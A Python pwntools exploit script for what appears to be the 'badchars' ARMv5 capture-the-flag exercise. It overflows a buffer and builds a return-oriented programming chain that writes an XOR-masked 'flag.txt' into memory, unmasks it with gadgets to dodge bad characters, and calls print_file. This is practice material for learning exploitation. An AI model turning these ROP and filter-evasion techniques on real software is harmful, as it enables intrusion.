#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('badchars_armv5')

#context.terminal=["tmux", "splitw", "-h"]
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# 156 : read
# 328 : ret
gs='''
b *pwnme+156
b *pwnme+328
c
'''

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r



g_pop_r3 = 0x00010690
g_pop_r4 = 0x000105b0
g_pop_r5r6 = 0x10614

# str r3, [r4] ; pop {r3, r4, pc}
g_str_r3r4 = 0x000105ec

# 0x00010610 : str r3, [r4] ; pop {r5, r6, pc}
g_str_r3r4 = 0x00010610
# pop {r0, pc}
g_pop_r0 = 0x000105f4

# 0x00010618 : ldr r1, [r5] ; eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
g_xor_r5r6 = 0x00010618

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']
main=elf.symbols['main']

io.recvuntil(b"> ")


offset=0x24

flagxored = xorchain(b"flag.txt",0b00111010,3)
log.info(f"flagxored    = {flagxored}")
log.info(f".data       = 0x{data:x}")
log.info(f".print_file = 0x{print_file:x}")


PL=b"A"*offset
# Ecriture de flag.txt xor 3
# 
PL+=p32(4)           # r4
PL+=p32(5)           # r11
PL+=p32(g_pop_r3)    # r3 <=
PL+=flagxored[:4]

PL+=p32(g_pop_r4)    # r4 <= data
PL+=p32(data)
PL+=p32(g_str_r3r4)
PL+=p32(5)           # r5
PL+=p32(6)           # r6
PL+=p32(g_pop_r3)
PL+=flagxored[4:8]
PL+=p32(g_pop_r4)
PL+=p32(data+4)
PL+=p32(g_str_r3r4)
PL+=p32(data+2)  # r5
PL+=p32(3)       # r6

# sequence de xor
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+3)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+4)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+6)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(data)       # r0

PL+=p32(print_file)
PL+=p32(main)


io.sendline(PL)
io.interactive()

